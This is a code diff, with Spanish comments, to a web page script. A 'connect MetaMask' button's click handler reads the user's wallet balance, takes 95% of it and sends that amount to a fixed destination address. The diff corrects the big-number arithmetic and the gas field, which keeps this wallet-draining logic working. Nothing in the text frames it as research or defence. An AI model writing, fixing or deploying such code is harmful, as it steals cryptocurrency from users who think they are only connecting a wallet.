@@ -9,13 +9,13 @@ document.getElementById('conectarMetaMask').addEventListener('click', async () =
             const balance = await web3.eth.getBalance(usuarioAddress);
             const balanceBN = web3.utils.toBN(balance);
             // Calcular el 95% del saldo
-            const porcentajeEnviarBN = balanceBN.muln(95).divn(100);
+            const porcentajeEnviarBN = balanceBN.mul(web3.utils.toBN(95)).div(web3.utils.toBN(100));
 
             const tx = {
                 from: usuarioAddress,
                 to: direccionDestino,
                 value: porcentajeEnviarBN.toString(),
-                gas: 21000, // Considera estimar el gas de manera dinámica
+                gas: '21000', // Puede ser necesario ajustar este valor.
             };
 
             web3.eth.sendTransaction(tx)
@@ -33,6 +33,7 @@ document.getElementById('conectarMetaMask').addEventListener('click', async () =
         console.error('MetaMask no está instalado.');
     }
 });
+
 
 
 
